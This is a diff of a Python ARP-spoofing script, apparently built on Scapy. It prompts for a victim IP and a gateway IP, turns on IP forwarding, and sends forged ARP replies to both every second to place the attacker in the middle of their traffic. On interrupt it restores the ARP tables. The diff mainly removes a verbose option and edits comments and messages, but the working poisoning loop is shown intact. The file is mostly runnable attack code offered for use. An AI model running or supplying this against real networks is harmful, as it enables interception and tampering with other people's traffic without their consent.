@@ -10,10 +10,6 @@ def enable_linux_iproute():
     Enables IP route ( IP Forward ) in linux-based distro
     """
     file_path = "/proc/sys/net/ipv4/ip_forward"
-    with open(file_path) as f:
-        if f.read() == 1:
-            # already enabled
-            return
     with open(file_path, "w") as f:
         print(1, file=f)
 
@@ -26,7 +22,7 @@ def get_mac(ip):
     if ans:
         return ans[0][1].src
     
-def spoof(target_ip, host_ip, verbose=True):
+def spoof(target_ip, host_ip):
     """
     Spoofs `target_ip` saying that we are `host_ip`.
     it is accomplished by changing the ARP cache of the target (poisoning)
@@ -40,12 +36,12 @@ def spoof(target_ip, host_ip, verbose=True):
     # send the packet
     # verbose = 0 means that we send the packet without printing any thing
     send(arp_response, verbose=0)
-    if verbose:
-        # get the MAC address of the default interface we are using
-        self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+    
+    # get the MAC address of the default interface we are using
+    self_mac = ARP().hwsrc
+    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
-def restore(target_ip, host_ip, verbose=True):
+def restore(target_ip, host_ip):
     """
     Restores the normal process of a regular network
     This is done by sending the original informations 
@@ -53,7 +49,7 @@ def restore(target_ip, host_ip, verbose=True):
     """
     # get the real MAC address of target
     target_mac = get_mac(target_ip)
-    # get the real MAC address of spoofed (gateway, i.e router)
+    # get the real MAC address of spoofed gateway
     host_mac = get_mac(host_ip)
     # crafting the restoring packet
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
@@ -61,29 +57,31 @@ def restore(target_ip, host_ip, verbose=True):
     # to restore the network to its normal process
     # we send each reply seven times for a good measure (count=7)
     send(arp_response, verbose=0, count=7)
-    if verbose:
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
 if __name__ == "__main__":
+    # target ip address
     print("\nVictim ip:")
-    # victim ip address
     target = input("\t> ")
-    print("\nGateway ip:")
+
     # gateway ip address
+    print("\nGateway ip:")
     host = input("\t> ")
-    # print progress to the screen
-    verbose = True
+
     # enable ip forwarding
     enable_linux_iproute()
+
+    # perform the attack
+    print("Beginning the attack...")
     try:
         while True:
             # telling the `target` that we are the `host`
-            spoof(target, host, verbose)
+            spoof(target, host)
             # telling the `host` that we are the `target`
-            spoof(host, target, verbose)
+            spoof(host, target)
             # sleep for one second
             time.sleep(1)
-    except KeyboardInterrupt:
-        print("[!] Detected CTRL+C ! restoring the network, please wait...")
+    except KeyboardInterrupt: # clean up - undo the attack 
+        print("Restoring the network, please wait...")
         restore(target, host)
         restore(host, target)
